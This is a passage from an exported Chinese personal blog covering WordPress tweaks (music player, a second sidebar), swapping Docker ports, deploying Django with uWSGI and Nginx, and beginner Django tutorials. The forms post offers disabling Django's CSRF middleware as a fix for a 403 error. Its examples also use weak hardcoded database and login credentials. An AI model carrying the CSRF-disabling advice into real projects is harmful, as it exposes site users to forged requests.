`ajaxloading_error_code`是ajax加载失败时显示在界面上的内容。\n\n在修改完基本的参数后，若~~代码~~魔改能力比较强，还可以需要根据自己的需求修改一些代码的细节。\n","tags":["JavaScript","Web前端","WordPress"],"categories":["博客相关"]},{"title":"WordPress网站添加音乐播放器","url":"//blog/1868/","content":"\n不少博客网站的站长都会在网页上放一个音乐播放器，访问者在浏览网站内容的同时还可以听听歌，相当舒适。因此，在网站中放置一个音乐播放器可以为网站增色不少。\n\nWordPress自带的音乐播放器的支持：\n\n\n- 小工具和页面中可以插入音频，但需要本地导入或设置音频链接，比较麻烦\n- 有一些音乐播放器插件可以下载，图方便可以直接安装使用，这里不再介绍\n\n这里介绍一款比较流行且精致的网页音乐播放器：APlayer，并结合Meting框架，在网页内插入音乐播放器。\n\n资源链接：\n\n{%link APlayer,GitHub,https://github.com/MoePlayer/APlayer%}\n\n{%link MetingJS,GitHub,https://github.com/metowolf/MetingJS %}\n\n使用方法格外简单，向网站中导入`APlayer.min.css`，`APlayer.min.js`与`Meting.min.js`，然后在主题的`footer.php`文件中插入以下代码\n\n```markup\n<div class=\"aplayer\"\n\tid=\"aplayer\"\n\tdata-id=\"5103395209\"\n\tdata-fixed=\"true\"\n\tdata-server=\"netease\"\n\tdata-type=\"playlist\">\n</div>\n```\n\n必要参数介绍：\n\n\n- `id`：`'aplayer'`\n- `data-id`：这里以我的网易云歌单的id号为例。歌单id的获取方法：进入网易云app的歌单，分享复制链接，链接中/playlist/后面的一串数字即为歌单id\n\n\n- `data-server`：`netease`是网易云，当然还支持一些其他平台，可以参考github上的文档\n- `data-type`：`playlist`指歌单，其他选项见github文档\n\n\n更多其他参数设置在官方文档上可以找到。\n\n\n后面我还做了一些网站的调整，例如全站Ajax化等，以适应音乐播放器的存在。\n","tags":["Web前端","WordPress"],"categories":["博客相关"]},{"title":"WordPress双侧边栏实现","url":"//blog/1830/","content":"\n制作WordPress主页时，由于不是所有主题都带有两个侧栏，有可能会遇到单个侧边栏不够用的情况：当侧边栏内容过多时，就会显得很长。因此我研究了一下如何为单侧栏主题再加上一个侧栏。（本文针对的是我自己用的主题，仅代表一种思路，若代码能力不强，一点WordPress框架都不懂建议还是别改了）\n\n我的WordPress使用的主题是LineDay，默认文章页在左侧，带有右侧栏。默认的主题格外空旷，两边都有很大的边距，感觉有点浪费，因此考虑把宽度弄大一点，再带上一个左侧栏，放一些无关紧要的东西，同时在手机端下隐藏左侧栏。\n\n\n首先需要简单了解WordPress侧边栏的生成原理。我了解到需要先在主题文件下的functions.php里注册一个sidebar，下面是我找到的一个示例：\n\n```php\nif ( function_exists('register_sidebar') )\n    register_sidebar(array('name'=>'sidebar1',\n        'before_widget' => '',\n        'after_widget' => '',\n        'before_title' => '<h2>',\n        'after_title' => '</h2>',\n));\n```\n\n但我随手粘贴上去，发现样式不对（样式对就怪了），因此我找到了我的主题文件里类似的一段代码，即为主题自带的侧边栏样式：\n\n```php\nregister_sidebar( array(\n        'name'          => __( 'Sidebar', 'lineday' ),\n        'id'            => 'sidebar-1',\n        'before_widget' => '<aside id=\"%1$s\" class=\"widget %2$s\">',\n        'after_widget'  => '</aside>',\n        'before_title'  => '<h1 class=\"widget-title\">',\n        'after_title'   => '</h1>',\n    ) );\n```\n\n将其复制到functions.php文件里，然后将`id`原先的`sidebar-1`改成`sidebar-2`即可。以上这段代码出现在主题文件的library文件夹下widgets.php文件里。\n\n\n接下来需要在模板文件中导入这个侧栏。方法也很简单，先来摸透导入侧边栏的原理，主题文件里有一个sidebar.php的文件，打开一看发现只有一句看似有用的代码：\n\n\n\n```php\n<div id=\"secondary\" class=\"widget-area col-sm-12 col-md-4\" role=\"complementary\" itemscope=\"itemscope\" itemtype=\"http://schema.org/WPSideBar\">\n\t<?php dynamic_sidebar('sidebar-1'); ?>\n</div>\n```\n\n另外还有一个page.php的文件，其中有一句`<?php get_sidebar(); ?>`\n\n\n通过官方文档了解到`get_sidebar()`函数的用法是这样的：`get_sidebar($name)`可以调用引入sidebar-name.php文件，默认为None。\n\n\n于是我重新建立了sidebar-left.php与sidebar-right.php文件，分别引入以下两段代码：\n\n\n\n```php\n<?php\n/**\n * The sidebar containing the main widget area.\n *\n * @package _s\n */\nif (!is_active_sidebar('sidebar-1')) {\n\treturn;\n}\n?>\n<div id=\"secondary\" class=\"widget-area hidden-xs hidden-sm col-md-3\" role=\"complementary\" itemscope=\"itemscope\" itemtype=\"http://schema.org/WPSideBar\">\n\t<?php dynamic_sidebar('sidebar-1'); ?>\n</div>\n<!-- #secondary -->\n```\n\n\n```php\n<?php\n/**\n * The sidebar containing the main widget area.\n *\n * @package _s\n */\nif (!is_active_sidebar('sidebar-2')) {\n\treturn;\n}\n?>\n<div id=\"tertiary\" class=\"widget-area col-sm-12 col-md-3\" role=\"complementary\" itemscope=\"itemscope\" itemtype=\"http://schema.org/WPSideBar\">\n\t<?php dynamic_sidebar('sidebar-2'); ?>\n</div>\n<!-- #teritary -->\n```\n\n其中div的bootstrap响应式类根据需求来调整即可。\n\n\n接下来只要去主题中所有模板文件（需要引入sidebar的地方）中引入这两个sidebar。\n\n\n在`get_header(); ?>`后面添上\n\n```plaintext\n<?php get_sidebar('left'); ?>\n```\n\n在`<?php get_footer(); ?>`前面添上\n\n```php\n<?php get_sidebar('right'); ?>\n```\n\n即可添加左右两个侧边栏到主页上。最后别忘了调整一下中间元素（一般id是primary）的响应式类。\n\n\n另外需要调整一下页面的宽度以避免过挤，只需要去自定义css里面手动调整container类的宽度即可。\n","tags":["Web前端","WordPress","PHP"],"categories":["博客相关"]},{"title":"记一次WordPress主页端口搬家","url":"//blog/1622/","content":"\n最开始接触docker，是为了部署一个叫做ShareLaTeX的东西。因为啥都不懂，故跟着网上许多博客教程一通瞎操作，就把ShareLaTeX部署在了服务器的80端口上；后又用docker搭建了WordPress博客，部署在了2333端口。\n\n刚开始用着倒还舒服，但强迫症日益发作，我心想，作为一个个人博客，怎么能部署在奇奇怪怪的2333端口呢，就老想着能不能把这俩容器的端口换一下。\n\n\n说干就干，但个人当时对docker以及WordPress的运行机制也并非特别熟悉，因此在搬家路上踩了不少坑。\n\n\n后来发现其实修改docker-compose.yml文件然后更新一下容器即可（前提是容器数据已单独挂载）\n\n\n我上网搜索了一下，找到了两种方法，第一种方法简单粗暴，直接删除容器新建一个，并重新指定端口即可，但似乎docker容器被删除后，存在里面的数据就没了（当时还不了解docker容器的本地挂载），我也没有试过储存并转移已有容器的数据，万一玩崩了就不太好，因此我试了下看上去比较稳妥的方法二：修改容器配置文件，重启docker服务。\n\n\n文中提到docker会将所有容器的配置信息存放在/var/lib/docker/containers/{container_hash_value}/hostconfig.json文件里，于是我一路cd带ls终于摸到了/var/lib/docker/containers目录下，再一个ls发现下面果然有一堆名字又臭又长的文件夹，似乎是一些hash值，可以用命令\n\n```bash\nsudo docker ps -a\n```\n\n查看容器对应的id，正是hash值的前几位，据此分别找到了ShareLaTeX容器和WordPress容器对应的文件夹，进入文件夹分别打开其中`hostconfig.json`，找到类似80，2333等数字（一看就是端口号），将其修改以后保存退出，（若要修改容器端口，则还需要去`config.vi.json`文件中进行修改）并重启docker。\n\n```bash\n# 重启docker\nsudo systemctl restart docker\n```\n\n做完以上工作，待docker重启完毕，我重新打开网站，发现端口号还是没有改过来，再`docker ps`命令查看一下，发现容器的端口号仍然没有改变，hostconfig.json文件里刚被我改掉的端口号又变回去了。\n\n\n刚开始以为自己忘了保存文件，但试了几次都还是老样子。我相当郁闷，但立马想到可能需要先把容器先停了。于是将ShareLaTeX和WordPress对应的容器全stop了，再按照前文的操作改了端口号，重启docker后，再把两个容器start起来，这回容器的端口终于成功交换，接下来就是处理一些琐碎的后事了，ShareLaTeX应该是没什么问题，打开看了一下能够正常使用，但直觉告诉我WordPress应该会炸。\n\n\n于是我尝试访问网站的80端口，果然浏览器加载了一会，给我自动跳转到了2333端口，第一感觉是可能浏览器缓存了网址浏览记录，但在清空了缓存之后，仍然自动跳转到2333端口。简单查了一下这个情况后，我了解到首次安装WordPress时，网站首页的地址会被存入数据库`wp-options`表中`option_name`字段值为`siteurl`和`home`的2条记录下，且记录的字段为`option_value`，以后访问网站时以数据库首页地址为准，仅仅改变web服务器映射地址仍会跳转到数据库存储的首页地址。因此只需登入数据库进行修改。\n\n\n现在访问80端口，已经可以正常进入主页了。但还有很多问题需要解决，这些问题与docker、WordPress都没有关系，大部分都是主题文件中或多或少出现了一些文件的绝对路径的问题，所以能不用绝对路径就不要用。\n\n\n对文件一通遍历以后，我把所有的绝对路径都改成相对路径，这下感觉应该没有问题了。但一会又出来一个新的问题：\n\n\n即之前网站里放的图片全加载失败，查看以后发现它们的src保留了原来的2333端口，没有自动进行修改，一通字符串替换就解决了这个问题。\n\n\n目前看来WordPress已经成功搬家了，暂时还没有遇到其他的问题。\n","tags":["数据库","WordPress"],"categories":["博客相关"]},{"title":"使用uWSGI与Nginx部署Django项目","url":"//blog/358/","content":"\nDjango项目在本地开发完成后，我们还需要将它部署到服务器上，以使得大家都能访问。这里我选择使用uWSGI和Nginx来提供web服务。\n\n## 主要软硬件依赖\n\n\n- 系统：Ubuntu18.04，1核CPU，2G内存，40G系统盘，5Mbps峰值带宽\n- Python3.6\n- uWSGI 2.0.19.1 （处理动态请求）\n- Nginx 1.14.0 （处理静态文件）\n\n当然以上版本只是个参考（并且已经部署成功了），可以视具体情况变动。\n\n\nuWSGI、Nginx、django项目与客户端的交互过程如下图所示：\n\n![](https://oss.fyz666.xyz/blogfiles/png/7f7518210d36d2b5be0725bf4904c6e6.png)\n## 安装软件\n\n\n### 安装python3.6\n\n\n我的Ubuntu镜像自带3.6版本的python，否则需要手动安装，可以参考[这个链接](https://www.cnblogs.com/zzqit/p/10087680.html)\n\n### 安装pip3\n\n```None\nsudo apt install python3-pip\n```\n\n### 安装Django项目的依赖库\n\n\n可以一个一个用pip3命令安装，也可以简单粗暴一点，用requirements.txt快速安装：\n\n```bash\n# 进入你的django项目根目录\ncd /path/to/django/project\npip3 freeze > requirements.txt\npip3 install -r requirements.txt\n```\n\n### 安装uWSGI\n\n```bash\npip3 install uwsgi\n```\n\n### 安装Nginx\n\n```bash\napt install nginx\n```\n\n## 配置uWSGI\n\n```bash\n# 在你的django根目录下创建uwsgi的配置文件并打开\nvi uwsgi.ini\n# 写入下面内容\n```\n\n\n```ini\n[uwsgi]\nsocket = 127.0.0.1:3400 # 以本地3400端口为例\n# Django-related settings\n# the django project directory (full path)\nchdir           = /path/to/django/project # 你的项目根目录绝对路径\n# Django's wsgi file\nmodule          = xxxx.wsgi # 指定使用的wsgi模块（django应该会自己生成）\n\n# process-related settings\n# master\nmaster          = true\n# maximum number of worker processes\nprocesses       = 2\n\nthreads = 2\nmax-requests = 6000\n\n# ... with appropriate permissions - may be needed\nchmod-socket    = 664\n# clear environment on exit\nvacuum          = true\n\ndaemonize = /path/to/django/project/uwsgi.log # 指定uwsgi日志文件的位置，一般就放项目根目录下\n```\n\n\n```bash\n# 启动uwsgi\nuwsgi --ini uwsgi.ini\n```\n\n## 配置Nginx\n\n```bash\n# 在项目根目录下创建Nginx的配置文件并打开，写入以下内容，并按注释修改一些基本配置\nvi /path/to/django/project/nginx.conf \n```\n\n\n```nginx\nserver {\n    # the port your site will be served on\n    listen      8080;\n    # the domain name it will serve for\n    server_name xxxx; # substitute your machine's IP address or FQDN\n    charset     utf-8;\n\n    access_log /path/to/django/project/access_log;\n    error_log  /path/to/django/project/error_log;\n\n    # max upload size\n    client_max_body_size 75M;   # adjust to taste\n\n    # Django media\n    #location /media  {\n    #    alias /to/your/mysite/media;  # your Django project's media files - amend as required\n    #}\n\n    location /static {\n        alias /path/to/django/project/static; # your Django project's static files - amend as required\n    }\n\n    # Finally, send all non-media requests to the Django server.\n    location / {\n        uwsgi_pass 127.0.0.1:3400;\n        include    /etc/nginx/uwsgi_params; # the uwsgi_params file you installed\n    }\n}\n```\n\n以上文件主要修改的有：\n\n\n- `listen`项（外部直接访问网站时的端口，别用6666-6669端口，会被浏览器禁）\n- `server_name`项（服务器的ip地址或已备案的域名）\n- `access_log`与`error_log`项（Nginx的日志文件）\n- `location /static` 下的`alias`后面的路径改为你项目的static目录的绝对路径\n- `location /` 下的`uwsgi_pass`后面改为之前`uwsgi.ini`中的`socket`值\n\n\n```bash\n# 在 /etc/nginx/sites-enabled 目录下建立上面配置的nginx.conf的软连接\nsudo ln -s nginx.conf /etc/nginx/sites-enabled\n# 删掉 /etc/nginx/sites-enabled 下的default文件\nsudo rm -rf /etc/nginx/sites-enabled/default\n# 重启nginx\nsudo systemctl restart nginx\n```\n\n接下来在浏览器中访问`<ip>:<port>`即可，阿里云的服务器需要预先打开该端口。\n","tags":["Linux","Django","Nginx","uWSGI"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:后台管理工具","url":"//blog/1537/","content":"\nDjango提供了一套友好完善的web端后台数据可视化管理工具。\n\n## Admin页面\n\n\n如 [Django从入门到放弃:路由与视图](/blog/1456/) 一文中提到的，若你在urls.py的`urlpatterns`中添加了以下一项（默认是自带的）：\n\n```python\npath('admin/', admin.site.urls),\n```\n\n则你可以通过访问`http://127.0.0.1/admin/`进入一个登录界面，所有项目的超级管理员账号都可以在此登录。登录成功后，会看到所有已注册app及其已注册数据表的可视化。\n\n\n这里举一个简单的例子，在one_app目录下的models.py中添加以下几行：\n\n```python\nfrom django.db import models\n\n\nclass Student(models.Model):\n    id = models.IntegerField(primary_key=True)\n    name = models.CharField(max_length=255)\n\n    class Meta:\n        managed = False\n        db_table = 'student'\n```\n\n并将其同步到本地MySQL数据库。然后在同级目录下的admin.py中添加：\n\n```python\nfrom django.contrib import admin\nfrom .models import Student\n\n# Register your models here.\nadmin.site.register(Student)\n```\n\n接下来就可以在Admin页面中看到新注册的数据表了。\n\n\n对于初学者而言，这些基础的功能就已经足够用以管理后台数据了，更多复杂的操作后期按需求即学即用就行~\n","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:会话与登录","url":"//blog/1508/","content":"\n## Session\n\n\n首先引用百度百科对session的解释：\n\n\n> Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web页时，如果该用户还没有会话，则Web服务器将自动创建一个 Session对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在Session对象中。有关使用Session 对象的详细信息，请参阅“ASP应用程序”部分的“管理会话”。注意会话状态仅在支持cookie的浏览器中保留。\n> \n> \n> [百度百科：session（计算机术语）](https://baike.baidu.com/item/Session/479100)\n\n\n个人对session的理解是：在用户登录成功时，服务器生成一个不易伪造的sessionid，发送到客户端，依靠cookie存放在浏览器中，用户在接下来的所有请求中，都带上这个cookie，服务器通过比对用户发来的sessionid对用户的身份进行判断。\n\n\nDjango作为比较完善的web框架自然也带了这个功能。\n\n\n## Login\n\n\n很多网站都会要求用户进行登录，以便在后期根据用户身份进行不同的操作。Django则自带了一个用户认证的框架与数据模型，可以说是相当的方便了。\n\n\n以下结合django的登录功能与会话功能实现一个简单的用户认证。\n\n```bash\n# 创建一个超级管理员\npython manage.py createsuperuser\n```\n\n随后你可以在数据库的auth_user表中见到新创建的超级管理员用户。超级管理员除了权限比较高，拥有项目后台的全部权限外，在认证、登录功能方面和普通用户别无两样。\n\n\n接下来在views.py中添加或修改以下代码：\n\n```python\n# 导入重定向函数\nfrom django.shortcuts import redirect\n# login函数用于登录,authenticate函数用于用户验证\nfrom django.contrib.auth import login, authenticate\n# 导入diango自带的User类(默认与数据库中的auth_user表进行连接)\nfrom django.contrib.auth.models import User\n\n# 对hello函数进行修改\ndef hello(request):\n\t# 判断用户是否登录\n\tif not request.user.is_authenticated:\n\t\tmessages.warning(request, '滚！')\n\t\treturn redirect('/login')\n\tusername = request.user.username\n\t# 随时取用session里面的键值对,在控制台查看输出结果\n\tprint(request.session.get('is_login'))\n\treturn render(request, 'hello.html', {'username': username})\n\n# 对mylogin函数进行修改\ndef mylogin(request):\n\tif request.method == 'GET':\n\t\treturn render(request, 'form.html')\n\tusername = request.POST.get('username')\n\tpassword = request.POST.get('password')\n\t# 验证用户名与用户,authenticate函数在密码验证通过且该用户的is_active字段值为1时返回一个User对象,否则返回None\n\tuser = authenticate(username=username, password=password)\n\tif user:\n\t\t# 用内置函数进行登录,该函数会自动生成一个sessionid记录在数据库中\n\t\tlogin(request, user)\n\t\t# 自己也可以往session里面放一些键值对随时取用\n\t\trequest.session['username'] = username\n\t\trequest.session['is_login'] = 1\n\t\t# 设置session的失效时间,单位为秒,设为0则浏览器关闭时失效\n\t\trequest.session.set_expiry(600)\n\t\tmessages.success(request, '登录成功！')\n\t\t# 重定向到/hello\n\t\treturn redirect('/hello')\n\tmessages.warning(request, '用户名或密码错误！')\n\treturn redirect('/login')\n    \n```\n\n修改hello.html如下：\n\n```markup\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\nhello!{{ username }}\n{% if messages %}\n     {% for message in messages %}\n         <script>alert('{{ message }}');</script>\n     {% endfor %}\n{% endif %}\n</body>\n</html>\n```\n\n","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:请求与表单","url":"//blog/1490/","content":"\n## Request\n\n\nDjango框架在收到web客户端请求的时候，会先判断请求的url，通过urls.py路由文件把该url映射到视图函数，然后执行视图函数的一系列操作，返回给客户端一个response。在前文中也已经定义过一些很简单的视图函数，容易发现它们都必须携带一个参数request（当然你可以任意起名，叫request只是因为传入的对象是一个WSGIRequest）。\n\n\n这个request变量自带了一堆属性，例如method、GET、POST、user、session等。\n\n\n其中通过`request.method`可以判断请求的方法，当请求方法为GET时，`request.GET`会返回一个QueryDict对象（和字典类似），其包含了该次请求的所有GET参数；POST方法同理。\n\n\n`request.user`可以获得一个User对象，为当前登录的用户，以后讲到登录功能时再提。\n\n\n## Form\n\n\n表单通常用于发起POST请求（当然也可以GET），以下举一个django框架中表单的例子。\n\n\n首先，在templates文件夹下放一个form.html，写入一个简单的登录表单：\n\n```markup\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>form</title>\n</head>\n<body>\n\t<form action=\"#\" method=\"POST\">\n\t\t<input type=\"text\" name=\"username\" required>\n\t\t<input type=\"password\" name=\"password\" required>\n\t\t<input type=\"submit\">\n\t</form>\n</body>\n<!-- 用于接收后端发来的message -->\n{% if messages %}\n     {% for message in messages %}\n         <script>alert('{{ message }}');</script>\n     {% endfor %}\n{% endif %}\n</html>\n```\n\nhelloworld文件夹下的urls.py中在`urlpatterns`列表添加一项：\n\n```python\npath('login/', views.mylogin),\n```\n\nviews.py添加导入与函数：\n\n```python\nfrom django.contrib import messages\n\ndef mylogin(request):\n\tif request.method == 'GET':\n\t\treturn render(request, 'form.html')\n        # 键取的是html中表单组件的name\n\tusername = request.POST.get('username')\n\tpassword = request.POST.get('password')\n\tif username == 'admin' and password == 'adminpwd':\n\t\tmessages.success(request, '登录成功！')\n\telse:\n\t\tmessages.warning(request, '用户名或密码错误！')\n\treturn render(request, 'form.html')\n```\n\n然后我们将项目运行在本地80端口，并访问`http://127.0.0.1/login/`，可以看到一个充满了简约风的表单页面，填入admin和adminpwd并提交即可。\n\n\n提交以后网页显示\n\n```raw\nForbidden (403)\nCSRF verification failed. Request aborted.\n...\n```\n\n这是说表单在提交时缺少CSRFtoken，是django默认带有的一种保护机制（正所谓防君子不防小人系列）。\n\n\n解决这个问题有两种方法：\n\n\n- 找到settings.py文件大约第42行，`MIDDLEWARE`参数中将第四项`django.middleware.csrf.CsrfViewMiddleware`注释掉。\n- 在html表单里面添加`{% csrf_token %}`\n\n这样就可以正常将提交到后端进行处理了。\n","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:模型（数据库）","url":"//blog/1479/","content":"\n## Models\n\n\n模型是django对数据库的支持方式，一般写在`models.py`文件当中。Django支持的数据库有sqlite3、MySQL、PostgreSQL等，我用的是MySQL。\n\n### 数据库配置\n\n\n找到`settings.py`文件大约77行：\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n```\n\n可见默认的数据库为`sqlite3`，于是我把这些代码全注释掉，并换成以下：\n\n```python\nDATABASES = { \n    'default': \n    { \n        'ENGINE': 'django.db.backends.mysql', \n        'NAME': 'helloworld_db',# 数据库名\n        'HOST': '127.0.0.1',# 数据库地址，若为本机则是127.0.0.1\n        'PORT': 3306,# 数据库端口，MySQL默认3306\n        'USER': 'root',# 数据库用户名\n        'PASSWORD': '123456',# 用户名对应密码\n    }  \n}\n```\n\n另外在`settings.py`同级的`__init__.py`文件中写入：\n\n```python\nimport pymysql # 需要装好这个库\npymysql.install_as_MySQLdb()\n```\n\n### 数据表迁移\n\n\n这一块有点晕，我搞了好久才搞明白。\n\n\n- `python manage.py makemigrations`命令会在所有app（或指定app）下的`migrations`文件夹中根据该app的`models.py`生成一些迁移文件（大概长这样：`0001_xxx.py`），若`models.py`较上一次使用该命令时没有变化，则会输出`No changes detected`。\n- `python manage.py migrate`命令会根据所有app（或指定app）的迁移文件在数据库中生成数据表并进行同步。\n\n以上两条命令都可以在最后添加某个app的名字，指定对该app进行单独操作。\n\n\nDjango自带有一些默认的app，这些app不需要`makemigrations`，查看`\\Lib\\site-packages\\django\\contrib`文件夹会发现每个自带的app例如auth、admin都已经自带上面的迁移文件了，不需要修改就可以使用。\n\n`migrate`命令运行后，数据库中会生成一张名为`django_migrations`的表，用以记录目前已经迁移过的迁移文件，这会导致下次使用`migrate`命令时会跳过这些已经迁移过的文件，若想查看迁移文件可使用命令：\n\n```powershell\npython manage.py showmigrations\n```\n\n结果中左侧带[X]的文件即已经被迁移过的，带[ ]的文件则尚未被迁移过。\n\n\n若要删除django_migrations中的迁移记录，有一些方法：\n\n\n- 运行命令\n\n\n```powershell\npython manage.py migrate --fake app名 zero\n```\n\n- 简单粗暴直接在django_migrations表删除该app相关的迁移记录\n\n不论使用哪种方法，都记得把数据库中的该app的相关表删掉，不然下次使用`migrate`的时候就会报`Tabel 'xxx' already exists`错误。\n\n\n为了充分利用django自带的app模型，只要有需求，我每次创建完项目都会先跑一句`migrate`命令，把django自带的models迁移到数据库里面。\n\n\n### 反向生成models\n\n\n作为一个懒人，我怎么可能手打`models.py`，于是我翻出了一件神器：`inspectdb`命令，只要在数据库中预先建好表，然后运行：\n\n```powershell\npython manage.py inspectdb > models.py\n```\n\n就可以将所有数据库里的表反向转化为models.py文件供django使用。\n\n`inspectdb`后面写上以空格分隔的表名，就可以只转换一部分表：\n\n```powershell\npython manage.py inspectdb [tabel1] [tabel2] > models.py\n```\n\n这里我实际操作的时候跳进了一个坑：我在反向生成models.py文件到一个app目录下后，运行服务时产生以下报错：\n\n```raw\n...\nOSError: [WinError 123] 文件名、目录名或卷标语法不正确。: '<frozen importlib._bootstrap>'\n```\n\n根据网上大佬的博文，终于找到了根源。原来使用`inspectdb`生成的models.py默认是utf-16编码，需要改为utf-8。修改成功后项目就能正常运行了。\n\n\n### Models的使用\n\n\n从models.py文件中导入类，就可以轻松操作数据库进行增删改查，详细的接口直接查阅官方文档即可。\n","tags":["Django","Python","数据库"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:模板与静态文件","url":"//blog/1459/","content":"\n## Templates\n\n\n前文通过HttpResponse返回了一个简单到不能再简单的网页，但如果想要返回复杂一点的网页，应该怎么办呢？\n\n当然你完全可通过`HttpResponse`返回一个巨大的html字符串，但这样让人感觉很不爽，其实可以预先把html文件写好放在一个templates文件夹里，后面直接返回这个文件就可以了。这就是django的模板功能。配置模板目录需要做以下两件事：\n\n\n- 在项目根目录下创建文件夹templates\n- 在settings.py第56行左右找到'DIRS'开头的代码并修改成下面这样：\n\n\n```python\n'DIRS': [BASE_DIR + '/templates', ],\n```\n\n使用方法：\n\n\ntemplates文件夹下放入xxx.html\n\n\nviews.py文件添加：\n\n```python\nfrom django.shortcuts import render\n```\n\n视图函数中可以通过\n\n```python\nreturn render(request, 'xxx.html')\n```\n\n来直接返回这个模板页面。\n\n\n`render`函数还支持向模板文件传递数据，例如：\n\n\n\n```python\nreturn render(request, 'hello.html', {'username': 'admin'})\n```\n\n接收方法：在模板文件中用一对双大括号包含字典的key，模板渲染时将其映射为value值。\n\n\n可以在hello.html中这样写：\n\n```markup\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\nhello!{{ username }}\n</body>\n</html>\n```\n\n访问`http://127.0.0.1/hello/`时就会得到hello!admin页面。\n\n\n模板文件所能做的远不止这些，其也支持控制流程序，例如也可以通过判断username是不是admin来进行一些其他操作：\n\n```markup\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\n{% if username == 'admin' %}\n    <script>alert('Welcome!admin');</script>\n{% else %}\n    <script>alert('You are not admin');</script>\n{% endif %}\n</body>\n</html>\n```\n\n上面举了一个模板中if语句的例子，当if语句成立时，模板将在网页上渲染第一个script，反之会渲染else后面的script。模板语法有一些和python差不多但也有很多其他独特的语法，另外所有模板代码语句都要放在`{% %}`之间\n\n\n关于模板文件的其他语法，可以查看[菜鸟教程](https://www.runoob.com/django/django-template.html)或[官方文档](https://docs.djangoproject.com/en/5.0/ref/templates/language/)。\n\n\n## Static\n\n\n网站的静态文件包含了一系列css、JavaScript等文件，因此有着举足轻重之作用。Django项目中有特定的方式存放静态文件。\n\n\n- 项目根目录下创建statics文件夹\n- settings.py最后添加：\n\n\n```python\nSTATICFILES_DIRS = [ \n    os.path.join(BASE_DIR, \"statics\"), \n]\n```\n\nmanage.py包含了一句命令可以收集项目中用到的所有静态文件到statics文件夹下（这一步操作是为了部署网站时的方便）\n\n```powershell\npython manage.py collectstatic\n```\n\n然而我一运行就报错：\n\n```raw\n...\ndjango.core.exceptions.ImproperlyConfigured: You're using the staticfiles app without having set the STATIC_ROOT setting to a filesystem path.\n```\n\n提示信息最后几行表示在settings.py中没有配置`STATIC_ROOT`这一参数，因此在文件最后添加：\n\n```python\nSTATIC_ROOT = os.path.join(BASE_DIR, 'statics')\n```\n\n然后还需要把刚才添加的`STATICFILES_DIRS`几行先注释掉（这坑我已经掉下去过了）\n\n\n然后重新跑前面的命令，statics文件夹下就会生成一个admin文件夹，它包含了admin界面所有静态文件。\n\n\n然后把`STATIC_ROOT`一行注释掉，取消`STATICFILES_DIRS`几行的注释，就可以正常启动项目了！（这坑我也掉下去了）\n\n\n### 模板中导入静态文件\n\n\n在html文件的第一行写入：\n\n```markup\n{% load static %}\n```\n\n然后就可以按以下格式导入静态文件：\n\n```markup\n<script src=\"{% static 'admin/js/actions.js'%}\"></script>\n```\n\nstatic即表示静态文件的目录statics，后面用单引号包含需要导入文件的相对路径即可。\n\n\n注意双引号单引号以及一对`{% %}`缺一不可！！\n","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:路由与视图","url":"//blog/1456/","content":"\n## urls和views\n\n\nurls.py文件其实定义了项目的路由，路由通俗来讲可以理解成网址去掉主机名之后的剩余部分。\n\nurls.py文件中默认只定义了一个`path('admin/', admin.site.urls)`，可以尝试访问`http://127.0.0.1/admin/`，就可以看到一个登录页面，这个东西就是个网站后台数据库管理平台，以后再说。\n\n\n当然我们可以加入自己的url，例如如果我们希望访问`http://127.0.0.1/hello`时得到一个写了helloworld的网页，就可以在urls.py中这么搞：\n\n\n- 在导入部分添加：\n\n\n```python\nfrom . import views\n```\n\n- 在`urlpatterns`列表中添加：\n\n\n```python\npath('hello/', views.hello),\n```\n\n桥豆麻袋！？`views`是什么玩意？\n\n\nviews.py在django中被称为视图文件，其实就是包含了一些后端的逻辑，用来处理各种请求，`views.hello`意为views.py文件中的`hello`函数，新添加的`path('hello/', views.hello)`表示用`hello`函数来处理来自'hello/'路由的请求。但是这个文件夹下并没有自动生成views.py，需要手动建立一个与urls.py同级的views.py文件，并写入：\n\n```python\nfrom django.http import HttpResponse\n\n# request参数必须加！！！不管后面有没有用到\ndef hello(request):\n    return HttpResponse('helloworld')\n```\n\n这个时候，访问`http://127.0.0.1/hello/`就可以进入一个写了helloworld的页面了。\n\n\n### app中的urls和views\n\n\n在helloworld文件夹下的urls中做如下操作：\n\n\n- 导入include函数\n\n\n```python\nfrom django.urls import include\n```\n\n- urlpatterns列表中添加一项：\n\n\n```python\npath('one_app/', include('one_app.urls')),\n```\n\n则'one_app/'成为网站根目录下应用one_app的子路径，同时one_app文件夹下的urls.py（app文件夹下没有生成urls.py，需要自己创建）中定义的路由将会拼接到'one_app/'后作为整个项目的url使用。例如若你在one_app/urls.py中定义了`path('hi/', views.xxx)`，那么你就可以通过访问`http://127.0.0.1/one_app/hi/`来获得`views.xxx`函数的响应。\n","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"Django从入门到放弃:项目的目录结构","url":"//blog/1384/","content":"\n## 前言\n\n\n大约半年多以前，我莫名其妙的对web开发产生了一些兴趣，通过对这个从未涉足过的领域的一点点简单了解，我认识到一个事实：~~PHP是最好的语言~~，作为一名Pythoner，我是不会承认的。\n\n另外我深知Python比较擅长的领域包含：“数据挖掘”、“爬虫”、“人工智能”、~~“Web开发”~~……emmmmm，虽然如此，但懒得学习其他语言的我仍然选择使用python作为后端开发语言，何况也有不少大型网站是用python作为后端语言的，例如“豆瓣”、“NASA官网”等等，这也给了我一些学习的底气。\n\n\n通过一些了解，我发现目前有四种主流的python 